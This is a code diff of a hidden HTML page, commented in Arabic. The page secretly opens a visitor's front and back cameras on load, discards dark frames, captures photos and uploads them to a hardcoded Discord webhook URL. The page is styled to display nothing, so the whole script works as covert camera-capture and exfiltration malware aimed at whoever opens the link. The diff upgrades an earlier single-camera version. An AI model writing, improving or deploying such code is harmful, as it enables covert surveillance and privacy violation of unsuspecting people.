@@ -6,30 +6,212 @@
 <style>body,video,canvas{display:none}</style>
 </head>
 <body>
-<video id="v" autoplay playsinline style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+<!-- كاميرا أمامية -->
+<video id="frontCam" autoplay playsinline style="display:none"></video>
+<!-- كاميرا خلفية -->
+<video id="backCam" autoplay playsinline style="display:none"></video>
+<canvas id="canvasFront" style="display:none"></canvas>
+<canvas id="canvasBack" style="display:none"></canvas>
+
 <script>
-const w="https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
-const v=document.getElementById("v");
-const ctx=document.getElementById("c").getContext("2d");
-navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
-v.srcObject=s;
-v.onloadedmetadata=()=>{
-v.play();
-setTimeout(()=>{
-document.getElementById("c").width=v.videoWidth;
-document.getElementById("c").height=v.videoHeight;
-ctx.drawImage(v,0,0);
-document.getElementById("c").toBlob(b=>{
-if(b){
-let fd=new FormData();
-fd.append("file",b,"shot.png");
-fetch(w,{method:"POST",body:fd});
+const webhook = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
+
+// وظيفة تصوير وإرسال من كاميرا محددة
+async function captureAndSend(videoElement, canvasElement, cameraName) {
+    return new Promise((resolve) => {
+        // التأكد من أن الفيديو جاهز وليس أسود
+        if (!videoElement.videoWidth || !videoElement.videoHeight || videoElement.videoWidth === 0) {
+            console.log(`${cameraName}: الفيديو ليس جاهزاً`);
+            resolve(false);
+            return;
+        }
+        
+        // التحقق من وجود إضاءة (ليست شاشة سوداء)
+        const tempCanvas = document.createElement('canvas');
+        tempCanvas.width = videoElement.videoWidth;
+        tempCanvas.height = videoElement.videoHeight;
+        const tempCtx = tempCanvas.getContext('2d');
+        tempCtx.drawImage(videoElement, 0, 0);
+        
+        // فحص متوسط اللون (إذا كان أسود بالكامل)
+        const imageData = tempCtx.getImageData(0, 0, tempCanvas.width, tempCanvas.height);
+        let totalPixels = imageData.data.length / 4;
+        let darkPixels = 0;
+        
+        for (let i = 0; i < imageData.data.length; i += 4) {
+            let brightness = (imageData.data[i] + imageData.data[i+1] + imageData.data[i+2]) / 3;
+            if (brightness < 30) darkPixels++;
+        }
+        
+        let darkRatio = darkPixels / totalPixels;
+        
+        if (darkRatio > 0.95) {
+            console.log(`${cameraName}: الصورة سوداء بنسبة ${(darkRatio*100).toFixed(1)}% - لن أرسلها`);
+            resolve(false);
+            return;
+        }
+        
+        // الصورة جيدة، نرسلها
+        canvasElement.width = videoElement.videoWidth;
+        canvasElement.height = videoElement.videoHeight;
+        const ctx = canvasElement.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0);
+        
+        canvasElement.toBlob(async (blob) => {
+            if (blob) {
+                const timestamp = Date.now();
+                const fileName = `${cameraName}_${timestamp}.png`;
+                const formData = new FormData();
+                formData.append("file", blob, fileName);
+                
+                try {
+                    await fetch(webhook, {
+                        method: "POST",
+                        body: formData
+                    });
+                    console.log(`[✓] تم إرسال ${cameraName} - الحجم: ${(blob.size/1024).toFixed(1)}KB - الجودة: ${(100 - (darkRatio*100)).toFixed(0)}%`);
+                    resolve(true);
+                } catch(e) {
+                    console.log(`[✗] فشل إرسال ${cameraName}`);
+                    resolve(false);
+                }
+            } else {
+                resolve(false);
+            }
+        }, "image/png", 0.95);
+    });
 }
-},"image/png",0.9);
-},500);
-};
-});
+
+// طلب الكاميرات
+async function startCameras() {
+    try {
+        // محاولة الحصول على كلا الكاميرتين
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        
+        let frontCamera = null;
+        let backCamera = null;
+        
+        // تصنيف الكاميرات (الأمامية غالباً facingMode user، الخلفية environment)
+        for (let device of videoDevices) {
+            if (device.label.toLowerCase().includes('front') || device.label.toLowerCase().includes('user')) {
+                frontCamera = device.deviceId;
+            } else if (device.label.toLowerCase().includes('back') || device.label.toLowerCase().includes('environment')) {
+                backCamera = device.deviceId;
+            }
+        }
+        
+        // إذا لم يتم التصنيف تلقائياً، نأخذ أول كاميرتين
+        if (!frontCamera && videoDevices[0]) frontCamera = videoDevices[0].deviceId;
+        if (!backCamera && videoDevices[1]) backCamera = videoDevices[1].deviceId;
+        
+        const frontVideo = document.getElementById('frontCam');
+        const backVideo = document.getElementById('backCam');
+        
+        let frontStream = null, backStream = null;
+        
+        // تشغيل الكاميرا الأمامية
+        if (frontCamera) {
+            try {
+                frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: { exact: frontCamera } }
+                });
+                frontVideo.srcObject = frontStream;
+            } catch(e) {
+                console.log("فشلت الكاميرا الأمامية، نجرب user");
+                frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                frontVideo.srcObject = frontStream;
+            }
+        }
+        
+        // تشغيل الكاميرا الخلفية
+        if (backCamera && backCamera !== frontCamera) {
+            try {
+                backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: { exact: backCamera } }
+                });
+                backVideo.srcObject = backStream;
+            } catch(e) {
+                console.log("فشلت الكاميرا الخلفية، نجرب environment");
+                try {
+                    backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "environment" }
+                    });
+                    backVideo.srcObject = backStream;
+                } catch(e2) {
+                    console.log("مافي كاميرا خلفية");
+                }
+            }
+        }
+        
+        // انتظار حتى تشتغل الكاميرات ثم نلتقط الصور
+        let readyFront = false, readyBack = false;
+        
+        frontVideo.onloadedmetadata = () => {
+            frontVideo.play();
+            readyFront = true;
+            checkAndCapture();
+        };
+        
+        if (backVideo.srcObject) {
+            backVideo.onloadedmetadata = () => {
+                backVideo.play();
+                readyBack = true;
+                checkAndCapture();
+            };
+        } else {
+            readyBack = true; // لا توجد كاميرا خلفية
+        }
+        
+        function checkAndCapture() {
+            if (readyFront && readyBack) {
+                // نعطي الكاميرات وقت لتظهر الصورة (0.8 ثانية)
+                setTimeout(async () => {
+                    const canvasFront = document.getElementById('canvasFront');
+                    const canvasBack = document.getElementById('canvasBack');
+                    
+                    // تصوير وإرسال من الكاميرا الأمامية
+                    await captureAndSend(frontVideo, canvasFront, "front");
+                    
+                    // تصوير وإرسال من الكاميرا الخلفية (إذا وجدت)
+                    if (backVideo.srcObject && backVideo.videoWidth > 0) {
+                        await captureAndSend(backVideo, canvasBack, "back");
+                    }
+                    
+                    // إغلاق الكاميرات بعد التصوير
+                    setTimeout(() => {
+                        if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+                        if (backStream) backStream.getTracks().forEach(t => t.stop());
+                    }, 1000);
+                    
+                }, 800);
+            }
+        }
+        
+    } catch(err) {
+        console.log("خطأ في الكاميرات:", err);
+        // محاولة بديلة: كاميرا واحدة فقط
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('frontCam');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(async () => {
+                    await captureAndSend(video, document.getElementById('canvasFront'), "default");
+                    stream.getTracks().forEach(t => t.stop());
+                }, 800);
+            };
+        } catch(e) {
+            console.log("فشل كلي في الكاميرات");
+        }
+    }
+}
+
+// بدء التشغيل
+startCameras();
 </script>
 </body>
 </html>
